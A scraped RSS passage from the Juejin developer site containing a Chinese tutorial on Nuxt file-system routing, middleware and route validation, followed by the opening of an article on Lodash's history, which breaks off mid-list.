<p>我手中的金箍棒，上能通天，下能探海</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[nuxt 路由一篇讲清楚]]></title>    <link>https://juejin.cn/post/7594310266411155456</link>    <guid>https://juejin.cn/post/7594310266411155456</guid>    <pubDate>2026-01-13T01:31:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594310266411155456" data-draft-id="7593234983755251722" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="nuxt 路由一篇讲清楚"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-13T01:31:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="江湖文人"/> <meta itemprop="url" content="https://juejin.cn/user/3044986347066480"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            nuxt 路由一篇讲清楚
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3044986347066480/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    江湖文人
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:31:09.000Z" title="Tue Jan 13 2026 01:31:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><p><code>Nuxt</code>的文件系统路由会为<code>pages/</code>目录中的每个文件创建一个路由。</p>
<p><code>Nuxt</code>的核心功能之一是文件系统路由器。<code>pages/</code>目录中的每个<code>Vue</code>文件都会创建一个对应的<code>URL</code>（或路由），用于展示该文件的内容。通过为每个页面使用动态导入，<code>Nuxt</code>利用代码分割技术，只为请求的路由加载最少的<code>JavaScript</code>。</p>
<h2 data-id="heading-0">页面</h2>
<p><code>Nuxt</code>路由基于<code>vue-router</code>构建，会根据<code>pages/</code>目录中创建的每个组件的文件名生成路由。</p>
<p>这种文件系统路由采用命名约定来创建动态路由和嵌套路由：</p>
<pre><code class="hljs language-md" lang="md">目录结构

<span class="hljs-bullet">-</span> pages/
-- about.vue
-- index.vue
-- posts/
--- [id].vue
</code></pre>
<pre><code class="hljs language-md" lang="md">生成的路由文件

{
  "routes": [
<span class="hljs-code">      {
          "path": "/about",
          "component": "pages/about.vue"
      },
      {
          "path": "/",
          "component": "pages/index.vue"
      },
      {
          "path": "/posts/:id",
          "component": "pages/posts/[id].vue"
      }
  ]
}
</span></code></pre>
<h2 data-id="heading-1">导航</h2>
<p><code>&lt;NuxtLink&gt;</code>组件用于在页面之间进行链接。它会渲染一个<code>&lt;a&gt;</code>标签，其<code>href</code>属性设置为目标页面的路由。应用程序激活后，页面切换通过<code>JavaScript</code>完成，同时更新浏览器的<code>URL</code>。这避免了整页刷新，并支持动画过滤效果。</p>
<p>当<code>&lt;NuxtLink&gt;</code>进入客户端的视口时，<code>Nuxt</code>会自动预加载链接页面的组件和有效载荷（生成的页面），从而实现更快的导航。</p>
<pre><code class="hljs language-html" lang="html">// pages/app.vue

<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">NuxtLink</span> <span class="hljs-attr">to</span>=<span class="hljs-string">"/about"</span>&gt;</span>关于<span class="hljs-tag">&lt;/<span class="hljs-name">NuxtLink</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">NuxtLink</span> <span class="hljs-attr">to</span>=<span class="hljs-string">"/posts/1"</span>&gt;</span>文章 1<span class="hljs-tag">&lt;/<span class="hljs-name">NuxtLink</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">NuxtLink</span> <span class="hljs-attr">to</span>=<span class="hljs-string">"/posts/2"</span>&gt;</span>文章 2<span class="hljs-tag">&lt;/<span class="hljs-name">NuxtLink</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<blockquote>
<p>Docs - API - Components - Nuxt Link.</p>
</blockquote>
<h2 data-id="heading-2">路由参数</h2>
<p>在<code>Vue</code>组件的<code>&lt;script setup&gt;</code>块或<code>setup()</code>方法中，可以使用<code>useRoute()</code>组合式<code>API</code>来访问当前路由的详细信息。</p>
<pre><code class="hljs language-html" lang="html">// pages/posts/[id].vue

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">const</span> route = <span class="hljs-title function_">useRoute</span>()

<span class="hljs-comment">// 访问 /posts/1 时，route.params.id 的值为 1</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(route.<span class="hljs-property">params</span>.<span class="hljs-property">id</span>)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-3">路由中间件</h2>
<p><code>Nuxt</code>提供了一个可自定义的路由中间件框架，你可以在整个应用中使用它，适合提取那些需要在导航到特定路由之前运行的代码。</p>
<blockquote>
<p>路由中间件在<code>Nuxt</code>应用的<code>Vue</code>部分运行。尽管名称相似，但它们与服务器中间件完全不同，服务器中间件在应用的<code>Nitro</code>服务器部分运行。</p>
</blockquote>
<p>路由中间件有三种类型：</p>
<p>1、匿名（或内联）路由中间件，直接定义在使用它们的页面中。</p>
<p>2、命名路由中间件，放置在<code>middleware/</code>目录中，当在页面上使用时，会通过异步导入自动加载。（注意：路由中间件的名称规范化为短横线命名法，因此<code>someMiddleware</code>会变为<code>some-middleware</code>）。</p>
<p>3、全局路由中间件，放置在<code>middleware/</code>目录中（带有<code>.global</code>后缀），会在每次路由变化时自动运行。</p>
<p>以下是保护<code>/dashboard</code>页面的<code>auth</code>中间件示例：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// middleware/auth.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineNuxtRouteMiddleware</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span></span>) =&gt;</span> {
   <span class="hljs-comment">// isAuthenticated() 是一个示例方法，用于验证用户是否已认证</span>
   <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isAuthenticated</span>() === <span class="hljs-literal">false</span>) {
       <span class="hljs-keyword">return</span> <span class="hljs-title function_">navigateTo</span>(<span class="hljs-string">'/login'</span>)
   }
})
</code></pre>
<h2 data-id="heading-4">路由验证</h2>
<p><code>Nuxt</code>通过每个需要验证的页面中<code>definePageMeta()</code>里的<code>validate</code>属性提供路由验证功能。</p>
<p><code>validate</code>属性接收<code>route</code>作为参数。你可以返回一个布尔值来确定这是否是一个可以用当前页面渲染的有效路由。如果返回<code>false</code>，将导致<code>404</code>错误。也可以直接返回一个包含<code>statusCode/statusMessage</code>的对象来自定义返回的错误。</p>
<p>如果有更复杂的使用场景，可以改用匿名路由中间件。</p>
<pre><code class="hljs language-html" lang="html">// pages/posts/[id].vue
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">
<span class="hljs-title function_">definePageMeta</span>({
    <span class="hljs-attr">validate</span>: <span class="hljs-title function_">async</span>(route) =&gt; {
      <span class="hljs-comment">// 检查 id 是否由数字组成</span>
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">typeof</span> route.<span class="hljs-property">params</span>.<span class="hljs-property">id</span> === <span class="hljs-string">'string'</span> &amp;&amp; <span class="hljs-regexp">/^\d+$/</span>.<span class="hljs-title function_">test</span>(route.<span class="hljs-property">params</span>.<span class="hljs-property">id</span>)
    }
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-5">核心</h2>
<p><strong>约定高于配置</strong>：通过在<code>pages/</code>目录中创建<code>.vue</code>文件，自动生成对应的路由。</p>
<p><strong>代码分割</strong>：每个页面组件都用动态导入，优化首屏加载性能。</p>
<p><strong>路径映射</strong>：文件路径直接映射为<code>URL</code>路径。</p>
<h2 data-id="heading-6">示例</h2>
<pre><code class="hljs language-md" lang="md">pages/
├── index.vue          → /
├── about.vue          → /about
├── posts/
│   ├── index.vue     → /posts
│   └── [id].vue      → /posts/:id (动态路由)
└── user/
<span class="hljs-code">    └── [id]/
        └── profile.vue → /user/:id/profile (嵌套路由)
</span></code></pre>
<h2 data-id="heading-7">API</h2>
<p><code>&lt;NuxtLink&gt;</code>：智能导航组件，支持预加载和客户端平缓过渡。</p>
<p><code>useRoute()</code>：获取当前路由信息（参数、查询等）</p>
<p><code>definePageMeta()</code>：定义页面元数据，包括验证规则。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Lodash 源码解读与原理分析 - Lodash 前世今生：设计原则与演进脉络]]></title>    <link>https://juejin.cn/post/7594398051721019430</link>    <guid>https://juejin.cn/post/7594398051721019430</guid>    <pubDate>2026-01-13T01:40:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594398051721019430" data-draft-id="7592552501578809370" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Lodash 源码解读与原理分析 - Lodash 前世今生：设计原则与演进脉络"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-13T01:40:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Anita_Sun"/> <meta itemprop="url" content="https://juejin.cn/user/1811635884786839"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Lodash 源码解读与原理分析 - Lodash 前世今生：设计原则与演进脉络
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1811635884786839/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Anita_Sun
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:40:32.000Z" title="Tue Jan 13 2026 01:40:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>lodash 作为前端最具代表的工具库，最初是为了解决UndersCore 的痛点而产生，之后经过多年的发展，历经了函数式、ES6、工程化等阶段，已发展为一个强大的前端基础设施。在第一章中，首先来介绍 lodash 的 发展历程以及设计的核心思想。</p>
<h2 data-id="heading-0">Underscore 时代</h2>
<p>要理解 Lodash，必先理解它的 “前身” Underscore——2009 年发布的 Underscore 是前端工具库的 “拓荒者”，在 ES5 尚未普及的年代，它首次系统化地封装了数组遍历、对象操作、函数增强等基础能力，让开发者摆脱了重复编写 <code>for</code> 循环、手动判断数据类型的繁琐。</p>
<h3 data-id="heading-1">Underscore 的设计思路</h3>
<blockquote>
<p>源码分析： <a href="https://link.juejin.cn?target=https%3A%2F%2Fbgithub.xyz%2Flessfish%2Funderscore-analysis%3Ftab%3Dreadme-ov-file" target="_blank" title="https://bgithub.xyz/lessfish/underscore-analysis?tab=readme-ov-file" ref="nofollow noopener noreferrer">bgithub.xyz/lessfish/un…</a></p>
<p>官网中所带注释的源码：</p>
<p>整体分析：<a href="https://link.juejin.cn?target=https%3A%2F%2Funderscorejs.org%2Fdocs%2Funderscore-esm.html" target="_blank" title="https://underscorejs.org/docs/underscore-esm.html" ref="nofollow noopener noreferrer">underscorejs.org/docs/unders…</a></p>
<p>模块分析：<a href="https://link.juejin.cn?target=https%3A%2F%2Funderscorejs.org%2Fdocs%2Fmodules%2Findex-all.html" target="_blank" title="https://underscorejs.org/docs/modules/index-all.html" ref="nofollow noopener noreferrer">underscorejs.org/docs/module…</a></p>
</blockquote>
<p>具体分析可以看这篇文章：<a href="https://juejin.cn/post/7593353611944230964" target="_blank" title="https://juejin.cn/post/7593353611944230964">juejin.cn/post/759335…</a></p>
<h2 data-id="heading-2">Lodash 的发展历程</h2>
<h3 data-id="heading-3">起源：Underscore 的性能与一致性痛点（2012 年）</h3>
<h4 data-id="heading-4">诞生背景：对 Underscore 的不满与改进诉求</h4>
<p>Lodash 由 <strong>John-David Dalton</strong>（GitHub 用户名 jdalton）于 2012 年 4 月 23 日创建，最初是 Underscore.js 的一个 fork。当时 Underscore 已成为前端开发的标配工具库，但存在两大核心痛点：</p>
<ul>
<li><strong>性能不足</strong>：核心方法复用原生高阶函数（如 <code>Array.prototype.forEach</code>），闭包与函数调用栈开销大，大数据量处理时卡顿明显；</li>
<li><strong>API 不一致</strong>：参数顺序混乱（部分方法 <code>(fn, arr)</code>，部分 <code>(arr, fn)</code>），边界处理无统一标准，容易出错；</li>
<li><strong>跨浏览器兼容性</strong>：对老旧浏览器（如 IE6+）的适配不够完善，部分方法存在边缘行为差异。</li>
</ul>
<p>Dalton 的初衷很明确：打造一个<strong>性能更优、API 更一致、兼容性更强</strong>的 Underscore 替代方案，同时保持 API 兼容性，让开发者可以无缝迁移。</p>
<h4 data-id="heading-5">命名由来：低调的 “下划线” 变体</h4>
<p>项目名称 “Lodash” 源自 “low dash”（低破折号）的谐音，形象地表达了它与 Underscore（下划线）的渊源 —— 既相似又有区别，就像破折号（-）比下划线（_）位置更低一样。</p>
<h3 data-id="heading-6">早期探索：从兼容到差异化（2012-2014 年，v0.x - v2.x）</h3>
<h4 data-id="heading-7">v0.x 阶段（2012 年 4-12 月）：快速迭代与核心能力构建</h4>
<ul>
<li>首个版本 v0.1.0 于 2012 年 4 月 23 日发布，仅包含基础的数组 / 对象 / 函数操作方法；</li>
<li>核心改进：重写 <code>_.each</code>/<code>_.map</code> 等遍历方法，用原生 <code>for</code> 循环替代原生高阶函数，性能提升 2-5 倍；</li>
<li>保持 API 兼容：完全复刻 Underscore 的核心方法，确保开发者 “零成本迁移”；</li>
